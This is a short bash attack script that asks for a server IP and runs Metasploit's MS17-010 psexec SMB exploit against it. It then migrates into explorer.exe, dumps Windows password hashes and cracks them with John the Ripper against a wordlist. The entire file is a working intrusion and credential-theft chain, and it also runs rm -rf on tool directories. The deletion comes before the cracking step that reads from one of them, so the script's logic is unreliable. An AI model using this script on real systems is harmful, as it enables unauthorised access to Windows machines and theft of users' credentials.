#!/bin/bash

echo "enter server ip: "
read lip

msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set RHOST $lip; exploit"  << EOF &> /dev/null
migrate -N explorer.exe
run post/windows/gather/smart_hashdump
exit

EOF

rm -rf root/.msf4
rm -rf /root/.john
john --format=NT /root/.msf4/loot/* --wordlist=/home/dnyanesh/password.lst
#john --format=NT /root/.msf4/loot/* --wordlist=/home/dnyanesh/password.lst
